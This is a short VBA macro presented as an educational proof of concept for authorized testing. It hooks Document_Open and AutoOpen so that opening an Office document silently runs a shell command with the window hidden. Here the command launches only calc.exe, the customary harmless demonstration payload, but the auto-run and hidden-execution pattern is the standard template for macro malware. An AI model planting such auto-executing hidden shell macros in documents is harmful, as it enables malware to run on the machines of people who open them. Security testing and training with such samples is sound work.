' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim command As String
    command = "calc.exe"
    Shell command, vbHide
    
    
End Sub
